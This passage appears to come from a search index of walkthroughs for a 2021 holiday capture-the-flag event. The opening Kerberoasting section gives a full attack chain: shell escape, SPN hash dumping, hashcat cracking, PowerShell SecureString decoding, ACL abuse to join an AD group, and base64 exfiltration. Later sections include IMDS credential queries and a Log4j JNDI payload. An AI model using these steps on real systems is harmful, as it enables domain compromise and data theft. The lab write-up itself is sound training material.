objective. To view the hints use the menu on the left. To start this objective register an account on ELFU Portal . You will be given credential and username/password for the \"ELFU University Student Grades Portal\". Connect to the SSH server for \"ELFU University Student Grades Portal\" using the command ssh oecfccqppq@grades.elfu.org -p 2222 . Escape the Grades Portal by pressing CTRL-D . Type the following in Python Interpreter to escape to Shell. import os ; os . system ( \"/bin/bash\" ); Run the command hostname to find the hostname for the device you're on. Ping the domain name to find the IP address of the DC as shown below: Based on the above output the Domain Controller name is hhc21-windows-dc.c.holidayhack2021.internal with the IP Address 10.128.1.53 . Use the command route to find the networks that are routable from grades.elfu.local . Use nmap to find the interesting hosts on these networks using the following command: nmap 10.128.1.0 / 24 - PS22 , 445 nmap 10.128.2.0 / 24 - PS22 , 445 nmap 10.128.3.0 / 24 - PS22 , 445 From the scan you will see two hosts that have port 445 open: hhc21-windows-dc.c.holidayhack2021.internal (10.128.1.53) = WINDOWS DC 10.128.3.30 = Appears to be the file server As per the conference video by Chris Davis , you can use GetUserSPNs.py to dump the SPNs and hashes for the domain. Modify and use the following command to dump the hashes (change the username/password): GetUserSPNs . py - outputfile spns . txt - dc - ip 10.128.1.53 elfu . local / oecfccqppq : < password > - request The output is shown below: The file spns.txt contains the hash for the account elfu_svc . Now lets create a wordlist using CeWL by scraping elfu.org website. To install CeWL run the following command from the shell: Git clone https : // github . com / digininja / CeWL cd CeWL bundle install Run the following command to scrape https://register.elfu.org/register : ruby -W0 ./cewl.rb https://register.elfu.org/register -w wordlist.txt --with-numbers Now get a copy of OneRuleToRuleThemAll.rule password cracking rule set for hashcat by running git clone https://github.com/NotSoSecure/password_cracking_rules . You should have spns.txt, which contains the hashes. wordlist.txt, which is a wordlist generated by CeWL. OneRuleToRuleThemAll.rule, rule list for hashcat. Download Hashcat and run it from the same folder as the above files with the following command: hashcat -m 13100 -a 0 \\s pns.txt --potfile-disable -r \\O neRuleToRuleThemAll.rule --force -O -w 4 --opencl-device-types 1 ,2 \\w ordlist.txt You will get an output similar to this: The cracked credential are: Crendetial Username: ELFU.LOCAL\\elfu_svc Password: Snow2021! From the grades.elfu.local device, run pwsh to enter powershell. List the shares on the file server 10.128.3.30 by using the elfu_svc account via the command smbclient -L 10.128.3.30 -U elfu_svc . You see there is a elfu_svc_shr and research_dep share. The elfu_svc account only grants you access to the elfu_svc_shr share and not the research_dep share. Connect to the elfu_svc_shr share with the command smbclient -U elfu_svc%Snow2021! //10.128.3.30/elfu_svc_shr . The 'ls' command will show the files in this share: Run prompt in the smb console to turn off prompting. Run mget * to download all the files on the share. Run the command egrep 'elfu' * to find hardcoded elfu domain credentials. The above shows the encoded secure password is stored in file GetProcessInfo.ps . Use the following commands to decode the encoded SecureString. $ SecStringPassword = \"76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA\" $ aPass = $ SecStringPassword | ConvertTo - SecureString - Key 2 , 3 , 1 , 6 , 2 , 8 , 9 , 9 , 4 , 3 , 4 , 5 , 6 , 8 , 7 , 7 ConvertFrom - SecureString - SecureString $ aPass - AsPlainText The output shows the credential for the user remote_elf . Credential User: elfu.local\\remote_elf Password: A1d655f7f5d98b10! Run the following powershell commands to create a remote PS session to the DC with the above credential: $ password = ConvertTo - SecureString \"A1d655f7f5d98b10!\" - AsPlainText - Force $ cred = New - Object System . Management . Automation . PSCredential - ArgumentList ( \"elfu.local \\r emote_elf\" , $ password ) Enter - PSSession - ComputerName hhc21 - windows - dc . c . holidayhack2021 . internal - Credential $ cred - Authentication Negotiate Run Get-ADGroup-Filter * on the DC to get a list of all the AD groups. The output shows that there is a group CN=Research Department,CN=Users,DC=elfu,DC=local which likely has access to the research dep share. Modify and run the following powershell code on the DC to grant genericAll access to your ELFU grades portal account (replace the username with your ELFU grades portal username): #give account \"tielcxbxev\" GenericAll Permissions Run From remote_employee terminal who has WriteDACL Add - Type - AssemblyName System . DirectoryServices $ ldapConnString = \"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local\" $ username = \"tielcxbxev\" $ nullGUID = [ guid ] '00000000-0000-0000-0000-000000000000' $ propGUID = [ guid ] '00000000-0000-0000-0000-000000000000' $ identityReference = ( New - Object System . Security . Principal . NTAccount ( \"elfu.local\\$username\" ) ) . Translate ([ System . Security . Principal . SecurityIdentifier ]) $ inheritanceType = [ System . DirectoryServices . ActiveDirectorySecurityInheritance ]:: None $ ACE = New - Object System . DirectoryServices . ActiveDirectoryAccessRule ( $ IdentityReference , ([ System . DirectoryServices . ActiveDirectoryRights ] \"GenericAll\" ), ([ System . Security . AccessControl . AccessControlType ] \"Allow\" ), $ propGUID , $ inheritanceType , $ nullGUID ) $ domainDirEntry = New - Object System . DirectoryServices . DirectoryEntry $ ldapConnString $ SecOptions = $ domainDirEntry . get_Options () $ secOptions . SecurityMasks = [ System . DirectoryServices . SecurityMasks ]:: Dacl $ domainDirEntry . RefreshCache () $ domainDirEntry . get_ObjectSecurity () . AddAccessRule ( $ ACE ) $ domainDirEntry . CommitChanges () $ domainDirEntry . dispose () Modify and run the following code on the DC to add your ELFU grades portal account to the research department group (replace $username and $password). Add - Type - AssemblyName System . DirectoryServices $ ldapConnString = \"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local\" $ username = \"tielcxbxev\" $ password = \"Lszfmilek@\" $ domainDirEntry = New - Object System . DirectoryServices . DirectoryEntry $ ldapConnString , $ username , $ password $ user = New - Object System . Security . Principal . NTAccount ( \"elfu.local\\$username\" ) $ sid = $ user . Translate ([ System . Security . Principal . SecurityIdentifier ]) $ b = New - Object byte [] $ sid . BinaryLength $ sid . GetBinaryForm ( $ b , 0 ) $ hexSID = [ BitConverter ]:: ToString ( $ b ) . Replace ( '-' , '' ) $ domainDirEntry . Add ( \"LDAP://<SID=$hexSID>\" ) $ domainDirEntry . CommitChanges () $ domainDirEntry . dispose () You can verify the group addition by running Get-ADGroupMember -identity \"ResearchDepartment\" | select name . Now exit the remote PS session on the DC by running exit . Connect to the research department share from the grades server using the ELFU grades portal account and the command smbclient -U tielcxbxev%Lszfmilek@ //10.128.3.30/research_dep . Here is a ls listing for the research department share: Run 'mget *' on the smb session to download SantaSecretToAWonderfulHolidaySeason.pdf . Exit the smb session. Exfiltrate the data by running this command on the grades server base64 ./SantaSecretToAWonderfulHolidaySeason.pdf . Copy and paste the BASE64 string to your local device as filebase64.txt . Decode the BASE64 file by running base64 -d filebase64.txt >SantaSecretToAWonderfulHolidaySeason.pdf Openning the file on a sandbox shows the following: Answer Kindness","title":"8) Kerberoasting on an Open Fire"},{"location":"posts/Objectives/Objective9/","text":"Objective Walk-through Details Location : KringleCon/Great Room Elf : Angel Candysalt Objective Link 1 : Link Elf's Objective Message Greetings North Pole visitor! I'm Angel Candysalt! A euphemism? No, that's my name. Why do people ask me that? Anywho, I'm back at Santa\u2019s Splunk terminal again this year. There's always more to learn! Take a look and see what you can find this year. With who-knows-what going on next door, it never hurts to have sharp SIEM skills! The terminal challenge for this objective is the terminal \"Yara Analysis\" offered by Fitzy Shortstack. Solving this terminal challenge provides additional hints for this objective. To view the hints use the menu on the left. To start this objective click on the \"splunk>\" terminal next to Angel Candysalt. This challenge has 8 tasks that need to be completed. The walk-through for each task can be accessed bellow with the corresponding tab number. Tasks 1 2 3 4 5 6 7 8 Task 1: Capture the commands Eddie ran most often, starting with git. Looking only at his process launches as reported by Sysmon, record the most common git-related CommandLine that Eddie seemed to use. Search for the following: index = main sourcetype = journald source = Journald : Microsoft - Windows - Sysmon / Operational EventCode = 1 user = eddie | stats count by CommandLine | sort - count Answer git status Task 2: Looking through the git commands Eddie ran, determine the remote repository that he configured as the origin for the 'partnerapi' repo. The correct one! Search for the following: index = main sourcetype = journald source = Journald : Microsoft - Windows - Sysmon / Operational EventCode = 1 user = eddie CommandLine = \"*git remote add*\" | stats count by CommandLine | sort - count Answer git@github.com :elfnp3/partnerapi.git Task 3: The 'partnerapi' project that Eddie worked on uses Docker. Gather the full docker command line that Eddie used to start the 'partnerapi' project on his workstation. Search for the following: index = main sourcetype = journald source = Journald : Microsoft - Windows - Sysmon / Operational EventCode = 1 user = eddie CommandLine = \"*docker*\" | stats count by CommandLine | sort - count Answer docker compose up Task 4: Eddie had been testing automated static application security testing (SAST) in GitHub. Vulnerability reports have been coming into Splunk in JSON format via GitHub webhooks. Search all the events in the main index in Splunk and use the sourcetype field to locate these reports. Determine the URL of the vulnerable GitHub repository that the elves cloned for testing and document it here. You will need to search outside of Splunk (try GitHub) for the original name of the repository. Search for the following: index = main sourcetype = github_json | stats count by \"repository.clone_url\" | sort - count Use the results and github commits to find the orignal repository name https://github.com/elfnp3/dvws-node/commits Answer https://github.com/snoopysecurity/dvws-node Task 5: Santa asked Eddie to add a JavaScript library from NPM to the 'partnerapi' project. Determine the name of the library and record it here for our workshop documentation. Search for the following: index = main sourcetype = journald source = Journald : Microsoft - Windows - Sysmon / Operational EventCode = 1 user = eddie CommandLine = \"*npm*\" | stats count by CommandLine | sort - count From the results you will see the command node /usr/bin/npm install holiday-utils-js . Answer holiday-utils-js Task 6: Another elf started gathering a baseline of the network activity that Eddie generated. Start with their search and capture the full process_name field of anything that looks suspicious. The above search will return two IP addresses. Looking at the IP address 54.175.69.219 we see the process nc.openbsd (which is netcat) with process_name of /usr/bin/nc.openbsd and process_id of 6791 . Answer /usr/bin/nc.openbsd Task 7: oh. This documentation exercise just turned into an investigation. Starting with the process identified in the previous task, look for additional suspicious commands launched by the same parent process. One thing to know about these Sysmon events is that Network connection events don't indicate the parent process ID, but Process creation events do! Determine the number of files that were accessed by a related process and record it here. Search the Sysmon logs for the process id 6791, which found in task 6: index = main sourcetype = journald source = Journald : Microsoft - Windows - Sysmon / Operational EventCode = 1 ProcessId = 6791 From the above results you see the ParentProcessId is 6788 . Search for the parent process using the following search: index = main sourcetype = journald source = Journald : Microsoft - Windows - Sysmon / Operational EventCode = 1 ParentProcessId = 6788 You will see the following process in the result: The above result shows 6 files. Answer 6 Task 8: Use Splunk and Sysmon Process creation data to identify the name of the Bash script that accessed sensitive files and (likely) transmitted them to a remote IP address. Search for the process_id of 6788 from Task 7 using the following search: index = main sourcetype = journald source = Journald : Microsoft - Windows - Sysmon / Operational EventCode = 1 process_id = 6788 The result will show the ParentCommandLine is /bin/bash preinstall.sh Answer preinstall.sh Once you solve task 8 you see the following message: Final Answer whiz","title":"9) Splunk!"},{"location":"posts/Terminals/%21template/","text":"Terminal Walk-through Details Location : KringoleCon/Kitchen Elf : Objective Link 1 : Elf's Objective Message The goal of this terminal challenge is to teach you about the terminal usage in the conference. To view the hints for this terminal challenge use the menu on the top. To solve this terminal challenge click the terminal and type in answer and press Enter.","title":"!template"},{"location":"posts/Terminals/Terminal1/","text":"Terminal Walk-through Details Location : North Pole/Orientation Elf : Jingle Ringford The goal of this terminal challenge is to teach you about the terminal usage in the conference. To solve this terminal challenge click the terminal and type in answer and press Enter.","title":"Cranberry Pi Terminal"},{"location":"posts/Terminals/Terminal10/","text":"Terminal Walk-through Details Location : FrostFest/Jack's Executive Restroom Troll : Noxious O. D'or Troll's Objective Message Hey, this is the executive restroom. Wasn't that door closed? I\u2019m Noxious O\u2019Dor. And I\u2019ve gotta say, I think that Jack Frost is just messed up. I mean, I'm no expert, but his effort to \"win\" against Santa by going bigger and bolder seems bad. You know, I\u2019m having some trouble with this IMDS exploration. I\u2019m hoping you can give me some help in solving it. If you do, I\u2019ll be happy to trade you for some hints on SSRF! I\u2019ve been studying up on that and have some good ideas on how to attack it! This terminal is located in Jack's Executive Restroom at FrostFest. Solving this terminal challenge provides additional hints for objective 10. To view the hints for this terminal challenge use the menu on the left. This terminal challenge is a tutorial for the IMDS services. This challenge consists of multiple puzzles. The puzzles walk you through what you need to do. Here are the answers for the first set of puzzles: IMDSv1 Answers ping 169.254.169.254 next curl http://169.254.169.254/latest curl http://169.254.169.254/latest/dynamic curl http://169.254.169.254/latest/dynamic/instance-identity/document curl http://169.254.169.254/latest/dynamic/instance-identity/document | jq curl http://169.254.169.254/latest/meta-data curl http://169.254.169.254/latest/meta-data/public-hostname curl http://169.254.169.254/latest/meta-data/public-hostname;echo curl http://169.254.169.254/latest/meta-data/iam/security-credentials;echo curl http://169.254.169.254/latest/meta-data/iam/security-credentials/elfu-deploy-role;echo For IMDSv2 part of this challenge you need to examine gettokens.sh . Running the command cat gettokens.sh will show the following: As the walk-through states: Quote This script will retrieve a token from the IMDS server and save it in the environment variable TOKEN. Import it into your environment by running 'source gettoken.sh'. Now, the IMDS token value is stored in the environment variable TOKEN. Examine the contents of the token by running 'echo $TOKEN'. Run the following commands to complete this challenge: IMDSv2 Answers source gettoken.sh echo $TOKEN curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/placement/region","title":"IMDS Exploration"},{"location":"posts/Terminals/Terminal11/","text":"Terminal Walk-through Details Location : KringleCon/Kitchen Elf : Tinsel Upatree Elf's Objective Message Hiya hiya, I'm Tinsel Upatree! Say, do you know what's going on next door? I'm a bit worried about the whole FrostFest event. It feels a bit... ill-conceived, somehow. Nasty even. Well, regardless \u2013 and more to the point, what do you know about tracing processes in Linux? We rebuilt this here Cranberry Pi that runs the cotton candy machine, but we seem to be missing a file. Do you think you can use strace or ltrace to help us rebuild the missing config? We'd like to help some of our favorite children enjoy the sweet spun goodness again! And, if you help me with this, I\u2019ll give you some hints about using Wireshark filters to look for unusual options that might help you achieve Objectives here at the North Pole. This terminal is located in the Kitchen at KringleCon. Solving this terminal challenge provides additional hints for objective 11. To view the hints for this terminal challenge use the menu on the left. To solve this terminal challenge you need to recreate the registration file for the cotton candy machine. You will need to use ltrace to figure out what the registration file for ./make_the_candy . Start by running ltrace ./make_the_candy . The above result shows that the program is looking for a file called registration.json . Create an empty file called registration.json by using vi or nano editors. Rerunning ltrace ./make_the_candy shows the following results: This indicates that the program is looking for the string \"[Description]\" following by a '\\n' new line. Use nano to edit registration.json and add \"[Description]\" and a new line by pressing enter. Save the file. Rerunning ltrace ./make_the_candy again shows the following results: This indicates that the program is looking for the string \"Registration: True\". Use nano to edit registration.json and add \"Registration:True\". Save the file. registration.json Registration:True Rerunning ltrace ./make_the_candy shows the candy machine is operational with the above registration.json file:","title":"Strace Ltrace Retrace"},{"location":"posts/Terminals/Terminal12/","text":"Terminal Walk-through Details Location : KringleCon/Dining Room Elf : Ribb Bonbowford Elf's Objective Message Hello, I'm Ribb Bonbowford. Nice to meet you! Are you new to programming? It's a handy skill for anyone in cyber security. This here machine lets you control an Elf using Python 3. It\u2019s pretty fun, but I\u2019m having trouble getting beyond Level 8. Tell you what\u2026 if you help me get past Level 8, I\u2019ll share some of my SQLi tips with you. You may find them handy sometime around the North Pole this season. Most of the information you'll need is provided during the game, but I'll give you a few more pointers, if you want them. Not sure what a lever requires? Click it in the Current Level Objectives panel. You can move the elf with commands like elf.moveLeft(5), elf.moveTo({\"x\":2,\"y\":2}), or elf.moveTo(lever0.position). Looping through long movements? Don't be afraid to moveUp(99) or whatever. You elf will stop at any obstacle. You can call functions like myFunction(). If you ever need to pass a function to a munchkin, you can use myFunction without the (). This terminal is located in the Dining Room at KringleCon. Solving this terminal challenge provides additional hints for objective 12. To view the hints for this terminal challenge use the menu on the left. To solve this terminal challenge you need to solve 9 levels. The solution for each of these levels is provided below: Answers for Levels 0 1 2 3 4 5 6 7 8 import elf , munchkins , levers , lollipops , yeeters , pits # Grab our lever object lever = levers . get ( 0 ) munchkin = munchkins . get ( 0 ) lollipop = lollipops . get ( 0 ) # move to lever position elf . moveTo ( lever . position ) # get lever int and add 2 and submit val leverData = lever . data () + 2 lever . pull ( leverData ) # Grab lollipop and stand next to munchkin elf . moveLeft ( 1 ) elf . moveUp ( 8 ) # Solve the munchkins challenge munchList = munchkin . ask () # e . g . [ 1 , 3 , \"a\" , \"b\" , 4 ] answer_list = [] for elem in munchList : if type ( elem ) == int : answer_list . append ( elem ) munchkin . answer ( answer_list ) elf . moveUp ( 2 ) # Move to finish import elf , munchkins , levers , lollipops , yeeters , pits elf . moveLeft ( 10 ) elf . moveUp ( 12 ) import elf , munchkins , levers , lollipops , yeeters , pits all_lollipops = lollipops . get () elf . moveTo ( all_lollipops [ 1 ]. position ) elf . moveTo ( all_lollipops [ 0 ]. position ) elf . moveLeft ( 3 ) elf . moveUp ( 8 ) import elf , munchkins , levers , lollipops , yeeters , pits lever0 = levers . get ( 0 ) lollipop0 = lollipops . get ( 0 ) elf . moveLeft ( 6 ) lever0 . pull ( lever0 . data () + 2 ) elf . moveTo ( lollipop0 . position ) elf . moveUp ( 12 ) import elf , munchkins , levers , lollipops , yeeters , pits lever0 , lever1 , lever2 , lever3 , lever4 = levers . get () elf . moveLeft ( 2 ) lever4 . pull ( \"A String\" ) elf . moveUp ( 2 ) lever3 . pull ( False ) elf . moveUp ( 2 ) lever2 . pull ( 2.3 ) elf . moveUp ( 2 ) lever1 . pull ([ 1 , 2 ]) elf . moveUp ( 2 ) lever0 . pull ({ \"Santa\" : \"Jack\" }) elf . moveUp ( 2 ) import elf , munchkins , levers , lollipops , yeeters , pits lever0 , lever1 , lever2 , lever3 , lever4 = levers . get () elf . moveLeft ( 2 ) lever4 . pull ( lever4 . data () + \" concatenate\" ) elf . moveUp ( 2 ) lever3 . pull ( not lever3 . data ()) elf . moveUp ( 2 ) lever2 . pull ( lever2 . data () + 1 ) elf . moveUp ( 2 ) a = lever1 . data () a . append ( 1 ) lever1 . pull ( a ) elf . moveUp ( 2 ) b = lever0 . data () b . update ({ \"strkey\" : \"strvalue\" }) lever0 . pull ( b ) elf . moveUp ( 2 ) import elf , munchkins , levers , lollipops , yeeters , pits lever = levers . get ( 0 ) data = lever . data () if type ( data ) == bool : data = not data elif type ( data ) == int : data = data * 2 elif type ( data ) == list : data = [ x + 1 for x in data ] elif type ( data ) == str : data = data + data elif type ( data ) == dict : data [ 'a' ] = data [ 'a' ] + 1 elf . moveUp ( 2 ) lever . pull ( data ) elf . moveUp ( 2 ) import elf , munchkins , levers , lollipops , yeeters , pits for num in range ( 3 ) : # not sure if number is right elf . moveLeft ( 3 ) elf . moveUp ( 12 ) elf . moveLeft ( 3 ) elf . moveDown ( 12 ) import elf , munchkins , levers , lollipops , yeeters , pits all_lollipops = lollipops . get () for lollipop in all_lollipops : elf . moveTo ( lollipop . position ) munchkin = munchkins . get ( 0 ) elf . moveLeft ( 8 ) elf . moveUp ( 2 ) json = munchkin . ask () print ( json ) for x , y in enumerate ( json ) : if ( json [ y ] == \"lollipop\" ) : munchkin . answer ( y ) elf . moveUp ( 2 ) Once you solve level 8 you will beat the game and be greeted with the following message:","title":"Elf Code Python"},{"location":"posts/Terminals/Terminal13/","text":"Terminal Walk-through Details Location : FrostFest/Frost Tower Lobby Troll : Gordy Goiterson Troll's Objective Message Hrmph. Snrack! Pthbthbthb. Gnerphk. Well, on to business. I'm Grody Goiterson. ... It's a family name. So hey, this is the Frostavator. It runs on some logic chips... that fell out. I put them back in, but I must have mixed them up, because it isn't working now. If you don't know much about logic gates, it's something you should look up. If you help me run the elevator, maybe I can help you with something else. I'm pretty good with FPGAs, if that's worth something to ya'. This terminal is located in the Frost Tower Lobby at FrostFest. Solving this terminal challenge provides additional hints for objective 13. To view the hints for this terminal challenge use the menu on the left. To solve this terminal challenge you need to fix the frostavator by configuring the logic gates. Click on frostavator and click on open panel . Arrange the logic gates as follow to fix the frostavator. Answer","title":"Frostavator"},{"location":"posts/Terminals/Terminal14/","text":"Terminal Walk-through Details Location : North Pole Elf : Bow Ninecandle Troll's Objective Message Well hello! I'm Bow Ninecandle! Sorry I'm late to KringleCon; I got delayed by this other... thing. Say, would you be interested in taking a look? We're trying to defend the North Pole systems from the Yule Log4Jack vulnerability. This terminal has everything you need to get going, and it'll walk you through the process. Go ahead and give it a try! No previous experience with Log4j required. We'll even supply a checker script in the terminal for vulnerable libraries that you could use in your own environment. The talk Prof. Petabyte is giving will be helpful too! Oh, and don't worry if this doesn't show up in your badge. This is just a fun extra! This terminal is located at the North Pole. This terminal challenge helps and walks you through understanding the Log4J vulnerabilty. This terminal challenge will walk through what you need to do, but just incase you need additional help, here are the commands you need to type in the terminal: yes next ls cd vulnerable ls cat DisplayFilev1.java javac DisplayFilev1.java java DisplayFilev1 testfile.txt java DisplayFilev1 testfile2.txt Next cat DisplayFilev2.java next javac DisplayFilev2.java java DisplayFilev2 testfile2.txt Next java DisplayFilev2 '${java:version}' java DisplayFilev2 '${env:APISECRET}' Next startserver.sh java DisplayFilev2 '${jndi:ldap://127.0.0.1:1389/Exploit}' Ctrl-C cd ~/patched/ ls source classpath.sh javac DisplayFilev2.java java DisplayFilev2 '${java:version}' Cd log4j2-scan vulnerable/ log4j2-scan patched/ log4j2-scan /var/www/solr Next ls /var/log/www cat logshell-search.sh logshell-search.sh /var/log/www logshell-search.sh /var/log/www | sed '1!d' logshell-search.sh /var/log/www | sed '2!d' logshell-search.sh /var/log/www | sed '3!d'","title":"Bonus! Blue Log4Jack"},{"location":"posts/Terminals/Terminal15/","text":"Terminal Walk-through Details Location : North Pole Elf : Bow Ninecandle Troll's Objective Message Hey, I'm Icky McGoop. Late? What's it to you? I got here when I got here. So anyways, I thought you might be interested in this Yule Log4Jack. It's all the rage lately. Yule Log4Jack is in a ton of software - helps our big guy keep track of things. It's kind of like salt. It's in WAY more things than you normally think about. In fact, a vulnerable Solr instance is running in an internal North Pole system, accessible in this terminal. Anyways, why don't you see if you can get to the yule.log file in this system? This terminal is located at the North Pole. This terminal challenge helps and walks you through utilizing scripts to exploit the Log4J vulnerabilty. The walk-through for this terminal challenge is provided here . This walk-through is provided by Josh Wright. To complete the terminal challenge you need to complete the following: As you complete the walk-through you may see something like this: When you compromise the webserver, you run cat /home/solr/kringle.txt to see the content of /home/solr/kringle.txt . Answer runtoanswer patching","title":"Bonus! Red Log4Jack"},{"location":"posts/Terminals/Terminal2/","text":"Terminal Walk-through Details Location : KringleCon/Courtyard Elf : Piney Sappington Objective Link 1 : Elf's Objective Message Hi ho, Piney Sappington at your service! Well, honestly, I could use a touch of your services. You see, I've been looking at these documents, and I know someone has tampered with one file. Do you think you could log into this Cranberry Pi and take a look? It has exiftool installed on it, if that helps you at all. I just... Well, I have a feeling that someone at that other conference might have fiddled with things. And, if you help me figure this tampering issue out, I\u2019ll give you some hints about OSINT, especially associated with geographic locations! The goal of this terminal challenge is to teach you about file Metadata and EXIFTOOL usage. To solve this terminal challenge click the terminal. You want to find the file that jack frost has tampered with. Run the command exiftool * -lastmodifiedby . This command shows a list of files and the last modified by metadata field. From the above result, you can see the file 2021-12-21.docx was modified by Jack Frost . Answer 2021-12-21.docx","title":"Exif Metadata"},{"location":"posts/Terminals/Terminal3/","text":"Terminal Walk-through Details Location : North Pole Troll : Greasy GopherGuts Troll's Objective Message Grnph. Blach! Phlegm. I'm Greasy Gopherguts. I need help with parsing some Nmap output. If you help me find some results, I'll give you some hints about Wi-Fi. Click on the terminal next to me and read the instructions. Maybe search for a cheat sheet if the hints in the terminal don't do it for ya'. You\u2019ll type quizme in the terminal and grep through the Nmap bigscan.gnmap file to find answers. The goal of this terminal challenge is to teach you about grep . To view the hints for this terminal challenge use the menu on the left. These are the questions you need to answer to solve this terminal challenge: Use the command grep '34.76.1.22' bigscan.gnmap to find the answer to question 1. What port does 34.76.1.22 have open? 62078 You can use a similar command to find the answer to the second question, grep '34.77.207.226' bigscan.gnmap . What port does 34.77.207.226 have open? 8080 The -c parameter in grep will count the number of matching lines. You can use the command grep 'Status: Up' bigscan.gnmap -c to find the answer to the third question. What port does 34.77.207.226 have open? 26054 The | operator in grep means OR . You can use this operator to specify multiple strings you're looking for. You can use the command grep -E '(80|8080|443)/open' bigscan.gnmap -c | wc -l to find all hosts that have 80 or 8080 or 443 open. The wc -l counts the number of matching lines. How many hosts have a web port open? (Let's just use TCP ports 80, 443, and 8080) 14372 You can use the command echo $((`egrep 'Up' bigscan.gnmap | wc -l` - `egrep 'Ports' bigscan.gnmap | wc -l`)) to find how many hosts are \"Up\" and how many ports are \"open\". This command will subtract the two results to find how many Up hosts have no open ports. How many hosts with status Up have no (detected) open TCP ports? 402 You can use the command grep -E \"(open\\/tcp.*){12,}\" bigscan.gnmap | wc -l to find the number of occurrences of open ports that are more than 12. You can change 12 to 13 to find that there are no matches for 13 occurrences. What's the greatest number of TCP ports any one host has open? 12","title":"Grepping for Gold"},{"location":"posts/Terminals/Terminal4/","text":"Terminal Walk-through Details Location : North Pole/Outside Santa's Castle Elf : Noel Boetie Elf's Objective Message Hello there! Noel Boetie here. We\u2019re all so glad to have you attend KringleCon IV and work on the Holiday Hack Challenge! I'm just hanging out here by the Logic Munchers game. You know\u2026 logic: that thing that seems to be in short supply at the tower on the other side of the North Pole? Oh, I'm sorry. That wasn't terribly kind, but those frosty souls do confuse me... Anyway, I\u2019m working my way through this Logic Munchers game. A lot of it comes down to understanding boolean logic, like True And False is False, but True And True is True. It can get a tad complex in the later levels. I need some help, though. If you can show me how to complete a stage in Potpourri at the Intermediate (Stage 3) or higher, I\u2019ll give you some hints for how to find vulnerabilities. Specifically, I\u2019ll give you some tips in finding flaws in some of the web applications I\u2019ve heard about here at the North Pole, especially those associated with slot machines! This terminal is located Outside of Santa's Castle in North Pole. Solving this terminal challenge provides additional hints for objective 4. To view the hints for this terminal challenge use the menu on the left. The logic chompers has 4 different levels. The rules of the game are as follow: You can access the game from the terminal or here . Open the game and Chrome developer tools. Select the Sources tab. Press 'Play' on the game. You can review the code for the game chompy.js . You can only Eat \"True\" and \"not False\" challenges - or like \"0=0\". The die() function subtracts the number of lives . To have more lives you can type lives=1000 in the console to get 1000 lives. You can see that the game is looking for a stage >= 3 and style == 4 to POST victorytoken . You can set these parameters by typing the following in the console: stage = 3 style = 4 On line 236, the code checks the variable workToDo to see if you've won the game. Set a breakpoint at line 236 and wait. When you hit the breakpoint type the following in the console: workToDo = False This command will bypass the game and win the stage. You can continue to type the above command every time the code hits the breakpoint to win the stage. Success Type workToDo = False in chrome developer console for the chompy.js app.","title":"Logic Muchers"},{"location":"posts/Terminals/Terminal5/","text":"Terminal Walk-through Details Location : KringleCon/Talks Lobby Elf : Jewel Loggins Elf's Objective Message Well hello! I'm Jewel Loggins. I have to say though, I'm a bit distressed. The con next door? Oh sure, I\u2019m concerned about that too, but I was talking about the issues I\u2019m having with IPv6. I mean, I know it's an old protocol now, but I've just never checked it out. So now I'm trying to do simple things like Nmap and cURL using IPv6, and I can't quite get them working! Would you mind taking a look for me on this terminal? I think there's a Github Gist that covers tool usage with IPv6 targets. The tricky parts are knowing when to use [] around IPv6 addresses and where to specify the source interface. I\u2019ve got a deal for you. If you show me how to solve this terminal, I\u2019ll provide you with some nice tips about a topic I\u2019ve been researching a lot lately \u2013 Ducky Scripts! They can be really interesting and fun! This terminal is located in the Talks Lobby at KringoleCon. Solving this terminal challenge provides additional hints for objective 5. To view the hints for this terminal challenge use the menu on the left. When you open the terminal you are greeted with the following window: To solve this challenge you need to enter the correct phrase to engage the candy striper. To find link local addresses for systems in your network segment, use the command 'ping6 ff02::1 -c2'. To find open ports on these two hosts use the commands nmap -6 fe80::42:c0ff:fea8:a003%eth0 and nmap -6 fe80::42:e6ff:fe92:471e%eth0 . Use curl to connect to port 80 on host fe80::42:c0ff:fea8:a002 using the command curl http://[fe80::42:c0ff:fea8:a002]:80/ --interface eth0 . Follow the instructions and connect to port 9000 using the command curl http://[fe80::42:c0ff:fea8:a002]:9000/ --interface eth0 . Type the response returned from the server in the top of the terminal to solve this challenge. Answer PieceOnEarth","title":"IPv6 Sandbox"},{"location":"posts/Terminals/Terminal6/","text":"Terminal Walk-through Details Location : KringleCon/Netwars Elf : Chimney Scissorsticks Elf's Objective Message Woo! I'm Chimney Scissorsticks, and I'm having a great time up here! I've been hanging out with all these NetWars players and not worrying about what's going on next door. In fact, I've really been having fun playing with this Holiday Hero terminal. You can use it to generate some jamming holiday tunes that help power Santa\u2019s sleigh! It's more fun to play with a friend but I've also heard there's a clever way to enable single player mode. Single player mode? I heard it can be enabled by fiddling with two client-side values, one of which is passed to the server. It's so much more fun and easier with a friend though! Either way, we'd really appreciate your help getting the sleigh all fueled up. Then I can get back to thinking about shellcode... This terminal is located in the Netwars at KringoleCon. Solving this terminal challenge provides additional hints for objective 6. To view the hints for this terminal challenge use the menu on the left. Here are the game instructions: Open the game in Chrome and open the developer tools. Look at the storage tab and cookies for hero.kringlecastle.com . Create a new room in the game. Change the cookie from {\"single_player\":false} to {\"single_player\":true} . In the console type single_player_mode = true . The computer joins the game when you type this. Play the game with the computer until you win. Success Cookie => {\"single_player\":true} Console type single_player_mode = true Play the game to win.","title":"Holiday Hero"},{"location":"posts/Terminals/Terminal7/","text":"Terminal Walk-through Please refer to Objective 6. Please refer to Objective 6 walk-through.","title":"Shellcode Primer"},{"location":"posts/Terminals/Terminal8/","text":"Terminal Walk-through Details Location : KringleCon/Santa's Office Elf : Eve Snowshoes Elf's Objective Message Hey there, how's it going? I'm Eve Snowshoes. Lately I've been spending a lot of cycles worrying about what's going on next door. Before that, I was checking out Fail2Ban. It's this slick log scanning tool for Apache web servers. If you can complete this terminal challenge, I\u2019d be happy to give you some things I\u2019ve learned about 